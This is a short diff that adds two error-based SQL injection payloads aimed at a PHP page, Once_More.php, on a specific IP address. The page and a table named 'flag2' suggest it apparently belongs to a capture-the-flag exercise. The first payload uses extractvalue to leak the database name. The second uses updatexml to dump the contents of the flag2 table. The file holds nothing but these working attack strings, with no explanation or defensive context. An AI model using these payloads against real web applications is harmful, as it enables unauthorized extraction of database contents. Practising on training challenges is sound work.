@@ -1,0 +1,5 @@
+http://123.206.87.240:9004/Once_More.php?id=1' and
+(extractvalue(1,concat(0x7e,database(),0x7e)))--+
+
+/Once_More.php?id=1%27%20and%20updatexml(1,concat(0x7e,(select group_concat(flag2) from flag2),0x7e),1);%20--+
+
